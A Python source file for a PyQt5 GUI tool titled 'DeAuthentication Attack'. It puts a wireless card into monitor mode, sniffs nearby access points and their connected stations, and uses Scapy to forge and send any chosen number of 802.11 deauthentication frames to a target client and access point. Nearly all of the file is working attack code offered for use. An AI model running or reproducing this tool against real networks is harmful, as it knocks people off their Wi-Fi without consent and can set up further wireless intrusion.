#!/usr/bin/env python
# coding=utf-8
from PyQt5.QtWidgets import QMainWindow, QApplication,QPushButton,QLineEdit, QLabel, QListWidget
from PyQt5 import QtGui, QtCore, QtWidgets
from PyQt5.QtCore import pyqtSlot
from scapy.all import *
from subprocess import check_output
import re
import threading
import pyx
import time

ssid_bssid = []
STA_list = []
channel_enganged = False

iface = "wlan0mon"
timeout = 1
channel_value = 1
resetflag = False
framecount = 0
breaksniff_flag = False
showStationButton = False

def channelThreadStarter():
	channelThread = threading.Thread(target = setChannel)
	channelThread.start()

def setChannel():
	while not breaksniff_flag:
		global channel_value
		time.sleep(2)

		#channel_value = random.randint(1,14)
		if channel_value == 13:
			channel_value = 1
		else:
			channel_value +=1
	#den her måde at skifte channel på går højst sandsynligt ALT ALT for hurtigt for resten af systemet, til at tjekke BSSIDs, osv. men den fanger faktisk de fleste.
	  # stderr=subprocess.PIPE simply "silences" the output.



def setMonitorMode():
	"""

	:return:
	"""
	checkphrase_mon_success = "monitor mode vif enabled"
	checkphrase_mon = "Mode:Monitor"

	moncheck = check_output(["iwconfig"],stderr=subprocess.PIPE).decode("UTF-8") #stderr=subprocess.PIPE simply "silences" the output.

	if checkphrase_mon in moncheck:
		print("wlan0mon is already in Monitor Mode!")

	else:
		airmoncheck = check_output(["airmon-ng", "start", "wlan0"],stderr=subprocess.PIPE).decode("UTF-8")
		if checkphrase_mon_success in airmoncheck:
			print("Sucessfully set wlan0 to Monitor Mode (now called wlan0mon)!")
		else:
			raise SystemExit("wlan0 has not entered Monitor Mode, recheck.")




def perform_deauth_attack(interface,dest,bssid,amount,channel_attack):

	"""
	interface, is the wireless interface
	destination is the target we wish to deuath
	bssid is the mac address of the AP. (string, MAC)

	:param interface:
	:param dest:
	:param bssid:
	:return:
	"""
	#global channel_attack_value only need to set it as globa in a function, if it is to be altered.
	global framecount #ville gerne bare kunne returne frame count af funktionen aka. i værdien, i forloopet, men problemet er at den er nødt til at køre som en Thread.

	channelset = check_output(["sudo","iwconfig","wlan0mon","channel",str(channel_attack)], stderr=subprocess.PIPE).decode("UTF-8")
	#det her gøres for at forsikre at interfacet sidder på den rigtige channel når den sider deauth frames
	# hvis interfacet IKKE sidder på den rigtige channel, så virker det ikke (sjovt nok)

	radio_p = RadioTap()
	dot11_frame = Dot11(subtype=0xc,addr1=dest,addr2=bssid,addr3=bssid) #0xc is hex for 12, and 1100 in integer (deuath sub type value)
	deauth = Dot11Deauth(reason=3) #reason list, see 802.11 deauth reason codes,
	# https://community.cisco.com/t5/wireless-mobility-documents/802-11-association-status-802-11-deauth-reason-codes/ta-p/3148055
	frame = radio_p/dot11_frame/deauth

	#frame.pdfdump()




	#hexdump(frame)
	#ls(frame)
	#frame.summary()


	#sendp(frame,iface=interface, count=amount,inter=0.1,verbose=False) #'wlan0mon' - set verbose true if you want to see frame output amount.
	#print(end-start) #takes about 3.6 seconds to send 1000 frames at a speed of 0.0001
	#sendpfast(frame,iface=interface,pps=1000,loop=amount,parse_results=1)

	#sendp(frame, iface=interface, count=amount,inter=0.2,verbose=False)
	#endTOTAL = time.time()
	#print(endTOTAL - startTOTAL)

	attack_timer = time.time()

	for i in range(0,amount):
		if resetflag == True:
			#print("RESET BUTTON CLICKED")
			return "RESET BUTTON CLICKED"
			#break
		else:
			#start = time.time()
			sendp(frame,iface=interface,verbose=False)
			#end = time.time()
			#print(end - start)
			framecount +=1

	end_attack_timer = time.time()
	total_attack_time = (end_attack_timer - attack_timer)
	print("TOTAL TIME SPENT ON frameS SENT")
	print(total_attack_time)
	print("TOTAL frameS SENT: ")
	print(framecount)

	#endTOTAL = time.time()
	#print(endTOTAL - startTOTAL)  # takes about 40 seconds to send 1000 deuath frames in a for loop.


def sniffevent(self):
	self.sniffbox.append("ehllo")
	if breaksniff_flag == False:
		if len(ssid_bssid)>0:
			for item in ssid_bssid:
				if item[0] not in self.sniffbox.toPlainText():
					self.sniffbox.append(item[0] + " " + item[1])

			self.sniffbox.repaint()

class App(QMainWindow):
	def __init__(self):
		super(App,self).__init__()
		self.title = "DeAuthentication Attack"
		self.setupUI()



	def setupUI(self):
		global framecount
		setMonitorMode()
		self.setWindowTitle(self.title)
		self.setGeometry(50,50,700,700)


		#MAC AP
		self.textboxAP = QLineEdit(self)
		self.textboxAP.setPlaceholderText("Enter the target AP MAC address")
		self.textboxAP.move(20,30)
		self.textboxAP.resize(280, 40)
		#MAC TARGET
		self.textbox = QLineEdit(self)
		self.textbox.setPlaceholderText("Enter the target MAC address")
		self.textbox.move(20,80)
		self.textbox.resize(280,40)

		#AMOUNT
		self.textbox_amount = QLineEdit(self)
		self.textbox_amount.setPlaceholderText("Enter amount of frames")
		self.textbox_amount.move(20,130)
		self.textbox_amount.resize(280,50)

		##channel for attack
		self.channeltextbox = QLineEdit(self)
		self.channeltextbox.setPlaceholderText("Enter the channel for the attack")
		self.channeltextbox.move(20,190)
		self.channeltextbox.resize(280,50)

		##ATTACK button
		self.attackbutton = QPushButton('ATTACK',self)
		self.attackbutton.resize(200,50)
		self.attackbutton.move(350,30)
		self.attackbutton.clicked.connect(self.on_attackclick)

		##RESET BUTTON
		self.resetbutton = QPushButton('RESET',self)
		self.resetbutton.resize(200,50)
		self.resetbutton.move(350,100)
		self.resetbutton.clicked.connect(self.on_resetclick)


		##SNIFF BUTTON
		self.sniffSSIDbutton = QPushButton('Sniff SSIDs',self)
		self.sniffSSIDbutton.resize(200,50)
		self.sniffSSIDbutton.move(350,170)
		self.sniffSSIDbutton.clicked.connect(self.on_ssidsniff)

		##SNIFF STATION BUTTON
		self.sniffStationbutton = QPushButton('Sniff Stations',self)
		self.sniffStationbutton.hide()
		self.sniffStationbutton.resize(200,50)
		self.sniffStationbutton.move(350,240)
		self.sniffStationbutton.clicked.connect(self.on_stationsniff)


		self.stopbutton = QPushButton('STOP',self)
		self.stopbutton.resize(200,50)
		self.stopbutton.move(350,310)
		self.stopbutton.clicked.connect(self.on_stopclick)



		#frame AMOUNT LABEL
		self.framelabel = QLabel("Sent : "+str(framecount)+"\n"+"DeAuthentication frames",self)
		self.framelabel.setFont(QtGui.QFont("Times",weight=QtGui.QFont.Bold))
		self.framelabel.move(20,230)
		self.framelabel.resize(270,100)

		#evt. lav QTextEdit?
		self.sniffbox = QListWidget(self)
		self.sniffbox.setSelectionMode(QtWidgets.QAbstractItemView.SingleSelection)
		self.sniffbox.itemSelectionChanged.connect(self.on_sniffClick)
		self.sniffbox.move(20,370)
		self.sniffbox.resize(600,310)


		#evt. lav QTextEdit?
		self.sniffStationbox = QListWidget(self)
		self.sniffStationbox.setSelectionMode(QtWidgets.QAbstractItemView.SingleSelection)
		self.sniffStationbox.itemSelectionChanged.connect(self.on_stationClick)
		self.sniffStationbox.move(20,370)
		self.sniffStationbox.resize(600,310)
		self.sniffStationbox.hide()

		self.show()

	#@pyqtSlot()
	def on_sniffClick(self):
		if (len(self.sniffbox.selectedItems()) != 0):
			self.textboxAP.setText((self.sniffbox.selectedItems()[0]).text()[12:29]) # Substring : AP Mac adress
			self.channeltextbox.setText((self.sniffbox.selectedItems()[0]).text()[-2:].strip()) # Substring : AP channel

	def on_stationClick(self):
		if (len(self.sniffStationbox.selectedItems()) != 0):
			self.textbox.setText((self.sniffStationbox.selectedItems()[0]).text()[15:32]) # Substring : AP Mac adress



	def checkifstop(self, frame):
		if breaksniff_flag == True:
			self.sniffbox.addItem("Sniffing stopped")
			self.sniffStationbox.addItem("Sniffing stopped")
			return "breaking"

	def FindSSIDtest(self,frame):
		global breaksniff_flag

		#we try a random channel every call, in an external thread
		moncheck = check_output(["sudo","iwconfig","wlan0mon","channel",str(channel_value)], stderr=subprocess.PIPE).decode("UTF-8")

		if frame.haslayer(Dot11): #der kunne bare stå haslayer(Dot11Beacon)
			if frame.type == 0 and frame.subtype == 8: #KUN beacon frames!!
				SSID = frame.info
				BSSID = frame.addr3.upper()
				#print(bssid)
				if (BSSID,SSID) not in ssid_bssid and len(SSID) != 0: #gider ikke hidden SSIDs aka 0 len.
					ssid_bssid.append((BSSID,SSID))
					ch = int(ord(frame[Dot11Elt:3].info))

					self.sniffbox.addItem("Found BSSID " + BSSID + " and SSID "+SSID +" on channel: " +str(ch))
					#print(ssid_bssid)

					#if time.time() > 10:
						#print(time.time())
						#breaksniff_flag = True

	def FindSTAinSpecificBSSID(self,bssidsearch,frame,channel):
	    global channel_enganged
	    if channel_enganged == False:
	        moncheck = check_output(["sudo", "iwconfig", "wlan0mon", "channel", str(channel)], stderr=subprocess.PIPE).decode("UTF-8")
	        channel_enganged = True


	    BSSID = "ff:ff:ff:ff:ff:ff"

	    if frame.haslayer(Dot11):
	        if frame.type == 2:
	            DS = frame.FCfield & 0x03
	            toDS = DS & 0x01 != 0
	            fromDS = DS & 0x2 != 0


	            if toDS == 0 and fromDS == 0:  # dette burde KUN være data frames der sendes til AP.
	                RA = DA = frame.addr1.upper()  # RA= REciver, DA = fianl destination
	                TA = SA = frame.addr2.upper()
	                BSSID = frame.addr3.upper()

	            elif toDS == 0 and fromDS == 1:
	                RA = DA = frame.addr1.upper()  # RA= REciver, DA = fianl destination
	                TA = BSSID = frame.addr2.upper()
	                SA = frame.addr3.upper()

	            elif toDS == 1 and fromDS == 0:
	                RA = BSSID = frame.addr1.upper()
	                TA = SA = frame.addr2.upper()
	                DA = frame.addr3.upper()

	            elif toDS == 1 and fromDS == 1:
	                RA = frame.addr1.upper()
	                TA = frame.addr2.upper()
	                DA = frame.addr3.upper()
	                SA = frame.addr4.upper()
	            else:
	                SA = "ff:ff:ff:ff:ff:ff"  # dette burde ikke kunne ske
	                BSSID = "ff:ff:ff:ff:ff:ff"

	            if (SA not in STA_list and BSSID == bssidsearch):
					STA_list.append(SA)
					self.sniffStationbox.addItem("Found Station: " + SA + " From AccessPoint: " + BSSID)
					print("Found Station: " + SA + " From AccessPoint: " + BSSID)



	def snifferfunction(self):
		sniff(iface="wlan0mon", count=0, prn=self.FindSSIDtest, store=0,stop_filter=self.checkifstop)


	def stationSniffer(self):
		#print(self.textboxAP.text())
		#print(self.channeltextbox.text())
		sniff(iface="wlan0mon", count=0, prn= lambda fr: self.FindSTAinSpecificBSSID(self.textboxAP.text(),fr,self.channeltextbox.text()), store=0, stop_filter=self.checkifstop)


	@pyqtSlot()
	def on_stationsniff(self):
		global breaksniff_flag
		self.sniffbox.clear()
		self.sniffStationbox.clear()

		self.sniffbox.hide()
		self.sniffStationbox.show()

		breaksniff_flag = False
		print("started station sniff")


		stationthread = threading.Thread(target = self.stationSniffer)
		stationthread.start()


	@pyqtSlot()
	def on_ssidsniff(self):
		global breaksniff_flag
		global showStationButton

		self.sniffbox.clear()
		self.sniffStationbox.clear()

		self.sniffbox.show()
		self.sniffStationbox.hide()
		self.sniffStationbutton.show()


		breaksniff_flag = False
		print("started bssid sniff")
		#self.sniffbox.setText(ssid_bssid[0])
		channelThread = threading.Thread(target = setChannel)
		channelThread.start()

		sniffingthread = threading.Thread(target = self.snifferfunction)
		sniffingthread.start()

		#sniffupdate = threading.Thread(target = self.sniffevent)
		#sniffupdate.start()

		# kan ikke lave check med is_alive her, da det vil bugge programmet op.


		#print("thread dead")




	@pyqtSlot()
	def on_attackclick(self):
		global resetflag
		global framecount
		print(threading.active_count())

		resetflag = False


		self.textboxAP.setEnabled(False)
		self.textbox.setEnabled(False)
		self.textbox_amount.setEnabled(False)
		self.channeltextbox.setEnabled(False)
		#self.textboxAP.setText("40:F2:01:9A:42:56")#test remove me
		#self.textbox.setText("94:65:2D:D8:2E:16") #test remove me

		bssid_targetMAC = self.textboxAP.text() #string
		destMAC = self.textbox.text() #string
		frame_amount_entered = int(self.textbox_amount.text())
		channel_attack_value = int(self.channeltextbox.text())
		print(bssid_targetMAC)
		print(destMAC)
		matchexpr = "[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$" #regex match


		if re.match(matchexpr, bssid_targetMAC.lower()) and re.match(matchexpr,destMAC.lower()) and (13>=channel_attack_value>=1):#checks if both inputs are valid MAC addreses (just format)
			print("VALID VALUES")
			attackthread = threading.Thread(target=perform_deauth_attack, args=(iface,destMAC, bssid_targetMAC, frame_amount_entered,channel_attack_value))
			attackthread.start()

			while attackthread.is_alive():
				self.framelabel.setText("Sent : "+str(framecount)+"\n"+"DeAuthentication Frames")
				self.framelabel.repaint() #need to repaint the label each iteration to update value

			self.framelabel.setText("Sent : " + str(framecount) + "\n" + "DeAuthentication Frames")
			self.framelabel.repaint()



		else:
			self.textbox_amount.setPlaceholderText("Enter amount of frames")
			self.textboxAP.setPlaceholderText("Enter valid AP MAC address")
			self.textbox.setPlaceholderText("Enter valid destination MAC address")
			self.textboxAP.setEnabled(True)
			self.textbox.setEnabled(True)
			self.textbox_amount.setEnabled(True)
			self.channeltextbox.setEnabled(True)
			self.textbox.clear()
			self.textboxAP.clear()
			self.textbox_amount.clear()
			self.channeltextbox.clear()


	@pyqtSlot()
	def on_stopclick(self):
		global breaksniff_flag
		breaksniff_flag = True

	@pyqtSlot()
	def on_resetclick(self):
		global resetflag
		global framecount
		global breaksniff_flag

		self.textbox.clear()
		self.textboxAP.clear()
		self.textbox_amount.clear()
		self.channeltextbox.clear()
		self.textboxAP.setEnabled(True)
		self.textbox.setEnabled(True)
		self.textbox_amount.setEnabled(True)
		self.channeltextbox.setEnabled(True)
		self.textboxAP.setPlaceholderText("Enter the target AP MAC address")
		self.textbox.setPlaceholderText("Enter the target MAC address")
		self.textbox_amount.setPlaceholderText("Enter amount of frames")
		self.channeltextbox.setPlaceholderText("Enter the channel for the attack")

		resetflag = True
		breaksniff_flag = True
		framecount = 0
		self.framelabel.setText("Sent : " + str(framecount) + "\n" + "DeAuthentication Frames")
		self.framelabel.repaint()

		#self.sniffbox.setText(ssid_bssid[0])






if __name__ == '__main__':
	app = QApplication(sys.argv)
	ex = App()
	sys.exit(app.exec_())
